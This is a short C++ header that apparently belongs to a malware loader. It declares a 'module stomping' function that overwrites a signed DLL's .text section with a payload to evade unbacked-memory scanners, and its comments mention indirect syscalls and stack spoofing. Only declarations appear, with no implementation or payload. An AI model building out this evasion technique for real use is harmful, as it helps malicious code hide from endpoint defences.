#pragma once
#include <cstddef>
#include <cstdint>

// Module stomping: load a sacrificial signed DLL and overwrite its .text with our payload
// Memory becomes DLL-backed, avoiding unbacked memory scanners
// All protection changes go through indirect syscalls + stack spoofing

struct StompedModule {
    void* base;         // base of the sacrificial DLL
    void* text_start;   // start of .text section
    size_t text_size;   // size of .text section
    bool stomped;       // whether payload was written
};

// Load sacrificial DLL and write payload into its .text section
// Returns pointer to payload location in memory (DLL-backed)
// Falls back to NtAllocateVirtualMemory if DLL .text is too small
void* stomp_module(const unsigned char* payload, size_t payload_size, StompedModule* out_info);
